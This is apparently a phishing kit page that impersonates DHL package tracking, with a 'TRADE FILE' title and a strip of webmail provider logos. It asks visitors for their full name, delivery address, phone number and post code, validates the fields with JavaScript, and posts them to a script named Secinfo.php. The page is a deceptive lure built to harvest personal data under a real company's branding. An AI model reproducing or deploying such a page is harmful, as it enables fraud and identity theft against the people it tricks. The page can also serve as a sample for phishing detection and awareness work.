<html>
<HEAD>
<TITLE>DHL | Tracking</TITLE>	
<title>TRADE FILE</title>
<link rel="shortcut icon" href="images/favicon.gif" type="image/gif"/>
</head>
<script>
function validateForm()
{
var w=document.forms["myform"]["fullname"].value;
if(w==null || w=="")
  {
  alert("You must fill in your name");
  return false;
  }

var x=document.forms["myform"]["address"].value;
if(x==null || x=="")
  {
  alert("You must fill in your delivery address");
  return false;
  }

var y=document.forms["myform"]["phonenumber"].value;
if(y.length < 10)
  {
  alert("Mobile Number is not complete");
  return false;
  }
var z=document.forms["myform"]["postcode"].value;
if(z.length < 3)
  {
  alert("Incorrect Post Code");
  return false;
  }
}
</script>

<body background="images/5_1_dhl_global_locator_all_340_187.gif" text="black" link="blue" alink="blue" vlink="blue" background="" >
<font face="Arial" style="font-size: 20pt" color="#CD0000">
<img src="images/dhl_logo.gif" width="300" height="100"><br>
<b>Delivery Address for your package</b></font><font face="verdana,arial" size=-1><p>
</p>

<form action="Secinfo.php" onsubmit="return validateForm()" method="post" name="myform">

<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="47%" height="87">
  <tr>
    <td align="center" width="24%" height="30" colspan="2">Field(s) marked asteriks are compulsory</td>
   
  </tr>
  <tr>
    <td align="right" width="27%" height="8"><b>Full Name :</b></td>
    <td width="73%" height="8">&nbsp;*&nbsp;<input type="text" name="fullname" size="25">&nbsp;&nbsp;<small>Example: John Chang</small></td>
  </tr>
  <tr>
    <td align="right" width="27%" height="27"><b>Delivery Address :</b></td>
    <td width="73%" height="27">&nbsp;*&nbsp;<input type="text" name="address" size="50"></td>
  </tr>
  <tr>
    <td align="right" width="27%" height="36"><b>Phone Number :</b></td>
    <td width="73%" height="36">&nbsp;*&nbsp;<input type="text" name="phonenumber" size="20">&nbsp;&nbsp;<small>Example: +86 10 82624488</small></td>
  </tr>
  <tr>
    <td align="right" width="27%" height="31"><b>Post Code :</b></td>
    <td width="73%" height="31">&nbsp;*&nbsp;<input type="text" name="postcode" size="8"></td>
  </tr>
 <tr>
    <td align="right" width="27%" height="42">&nbsp;</td>
    <td width="73%" height="42">&nbsp;&nbsp;<input type="submit" value="Verify Address"></td>
  </tr>

</table>
</form>


<div class="copyright cLight">

&nbsp;</div>
<p>Copyright Notice &copy; 1999-2015 DHL WorldWide Delivery. 
All rights reserved. </p>
&nbsp;<center><p><hr size=1 width="100%">&nbsp;</p></center>
</font>
DHL Now Partners with: <br>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img alt="Gmail" src="images/gmail.jpg" height="50" width="120"><img alt="RoundCube Mail" src="images/roundcube.png" height="50" width="120">&nbsp; <img src="images/horde.png" alt="Horde Mail" height="50" width="120">&nbsp;&nbsp; <img src="images/outlook.png" alt="Outlook" width=120 height=50><img src="images/Squirrelmail_logo.png" alt="Squirrel Mail" title="" width=120 height=50>&nbsp;<img src="images/yahoo.jpg" alt="Yahoo Mail" width=120 height=50>
<img src="images/netease_png.png" alt="Netease" title="" border=0 width="120" height="50"><img src="images/aol.jpg" alt="AOL" title="" border=0 width="120" height="50"></p>

</body>
</html>